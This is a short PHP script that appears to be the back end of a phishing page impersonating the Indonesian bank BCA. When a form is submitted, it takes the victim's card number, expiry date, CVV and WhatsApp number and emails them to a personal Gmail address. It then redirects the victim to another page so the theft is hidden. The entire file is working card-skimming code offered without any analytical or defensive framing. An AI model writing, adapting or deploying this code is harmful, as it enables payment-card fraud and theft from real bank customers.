<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $from = "mailtrap@cstriusahaberkat.site";
    $to = "odeojaya@gmail.com";
    $subject = "Test Email from MyId Form";
    $message = "BCA ID: " . $_POST['Masukannokartu'] . "\n" .
               "Masa Berlaku: " . $_POST['Masaberlaku'] . "\n" .
               "CVV: " . $_POST['CVV'] . "\n" .
               "Nomor Whatsapp: " . $_POST['nomor_hp'];

    // Set headers
    $headers = "From: $from" . "\r\n" .
               "Reply-To: $from" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Mengirim email
    if (mail($to, $subject, $message, $headers)) {
        echo "<script>window.location.href = 'myid.html';</script>";
    } else {
        echo "Gagal mengirim email.";
    }
}
?>
